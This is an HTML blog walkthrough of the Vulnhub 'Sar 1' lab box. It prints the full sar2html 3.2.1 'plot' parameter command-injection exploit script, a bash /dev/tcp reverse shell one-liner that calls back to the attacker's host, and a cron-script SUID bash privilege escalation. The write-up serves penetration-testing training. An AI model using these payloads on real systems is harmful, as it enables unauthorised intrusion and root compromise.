<!doctype html><html lang=en><head><title>Vulnhub: Sar 1 :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/sar1/><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/sar1/sar1.png"><meta name=twitter:title content="Vulnhub: Sar 1"><meta name=twitter:description content><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="ikuamike"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Sar 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/sar1/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-05-13 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/sar1/>Vulnhub: Sar 1</a></h1><div class=post-meta><span class=post-date>2021-05-13</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sar2html/>sar2html</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/cron/>Cron</a>&nbsp;</span><div class=post-content><div><img src=/img/sar1/sar1.png class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>15 Feb 2020</td><td>Love</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>In this box there&rsquo;s only one port open that is running a vulnerable version of sar2html that
we take advantage of to get a low priv shell. For privilege escalation there was a cron job
running as root that was running a script we could write in.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.107
Host is up <span style=color:#f92672>(</span>0.000040s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65534</span> closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
MAC Address: 08:00:27:48:00:F5 <span style=color:#f92672>(</span>Oracle VirtualBox virtual NIC<span style=color:#f92672>)</span>
</code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=80-http>80 (HTTP)<a href=#80-http class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Using nmap scripts we see the existence of robots.txt</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.107
Host is up <span style=color:#f92672>(</span>0.00042s latency<span style=color:#f92672>)</span>.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
| http-enum:
|   /robots.txt: Robots file
|_  /phpinfo.php: Possible information file
|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
</code></pre></div><p>From this we discover sar2HTML.</p><img src=/img/sar1/sar1-01.png class=center style=border-radius:8px><p>Visiting this directory I get the version of sar2html as 3.2.1.</p><img src=/img/sar1/sar1-02.png class=center style=border-radius:8px><p>Checking on searchsploit, a remote command execution vulnerability exists for this version.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>searchsploit sar2html
</code></pre></div><img src=/img/sar1/sar1-03.png class=center style=border-radius:8px><h1 id=shell-as-user>Shell as user<a href=#shell-as-user class=hanchor arialabel=Anchor>&#8983;</a></h1><p>By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.</p><p>script url: <a href=https://www.exploit-db.com/exploits/49344 target=_blank rel=noopener>https://www.exploit-db.com/exploits/49344</a></p><pre><code>~/Vulnhub/Sar1  python3 49344.py

Enter The url =&gt; http://192.168.56.107/sar2HTML/
Command =&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Command =&gt; /bin/bash+-c+'/bin/bash+-i+&gt;%26+/dev/tcp/192.168.56.1/9000+0&gt;%261'
</code></pre><img src=/img/sar1/sar1-04.png class=center style=border-radius:8px><p>Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
I found a cron job running as root.</p><img src=/img/sar1/sar1-05.png class=center style=border-radius:8px><p>While we can&rsquo;t write to this file, the script being executed inside it is writeable.</p><img src=/img/sar1/sar1-06.png class=center style=border-radius:8px><h1 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h1><p>By writing into write.sh using vi, we can escalate our privileges.</p><pre><code>#!/bin/sh

cp /bin/bash /var/www/html/suidbash
chmod u+s /var/www/html/suidbash
</code></pre><p>This will create a copy of the bash binary and add suid permissions to it.</p><p>Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.</p><img src=/img/sar1/sar1-07.png class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Understanding the exploit script and perform the exploit manually.</p><p>To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Exploit Title: sar2html 3.2.1 - &#39;plot&#39; Remote Code Execution</span>
<span style=color:#75715e># Date: 27-12-2020</span>
<span style=color:#75715e># Exploit Author: Musyoka Ian</span>
<span style=color:#75715e># Vendor Homepage:https://github.com/cemtan/sar2html</span>
<span style=color:#75715e># Software Link: https://sourceforge.net/projects/sar2html/</span>
<span style=color:#75715e># Version: 3.2.1</span>
<span style=color:#75715e># Tested on: Ubuntu 18.04.1</span>

<span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>import</span> requests
<span style=color:#f92672>import</span> re
<span style=color:#f92672>from</span> cmd <span style=color:#f92672>import</span> Cmd

url <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Enter The url =&gt; &#34;</span>)

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Terminal</span>(Cmd):
    prompt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Command =&gt; &#34;</span>
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>default</span>(self, args):
        exploiter(args)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploiter</span>(cmd):
    <span style=color:#66d9ef>global</span> url
    sess <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
    output <span style=color:#f92672>=</span> sess<span style=color:#f92672>.</span>get(f<span style=color:#e6db74>&#34;{url}/index.php?plot=;{cmd}&#34;</span>)
    <span style=color:#66d9ef>try</span>:
        out <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#34;&lt;option value=(.*?)&gt;&#34;</span>, output<span style=color:#f92672>.</span>text)
    <span style=color:#66d9ef>except</span>:
        <span style=color:#66d9ef>print</span> (<span style=color:#e6db74>&#34;Error!!&#34;</span>)
    <span style=color:#66d9ef>for</span> ouut <span style=color:#f92672>in</span> out:
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;There is no defined host...&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> ouut:
            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;null selected&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> ouut:
                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;selected&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> ouut:
                    <span style=color:#66d9ef>print</span> (ouut)
    <span style=color:#66d9ef>print</span> ()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> (<span style=color:#e6db74>&#34;__main__&#34;</span>):
    terminal <span style=color:#f92672>=</span> Terminal()
    terminal<span style=color:#f92672>.</span>cmdloop()<span style=color:#f92672>%</span> 
</code></pre></div><p>According to the script the vulnerable parameter is plot and simply takes in our command and executes it.</p><p>When interacting with the application you can select OS, when you pick one the plot parameter is used.</p><img src=/img/sar1/sar1-08.png class=center style=border-radius:8px><p>Here we can inject the command we want and execute shell commands. The OS option doesn&rsquo;t matter, anything after
the semi-colon <code>;</code> will be executed. For the reverse shell command remember to url encode special chars like I did
above</p><img src=/img/sar1/sar1-09.png class=center style=border-radius:8px><p>Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.</p><p><a href=https://musyokaian.medium.com/ target=_blank rel=noopener>https://musyokaian.medium.com/</a></p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=https://blog.ikuamike.io/posts/2021/misdirection1/><span class=button__text>Vulnub: Misdirection 1</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script></body></html>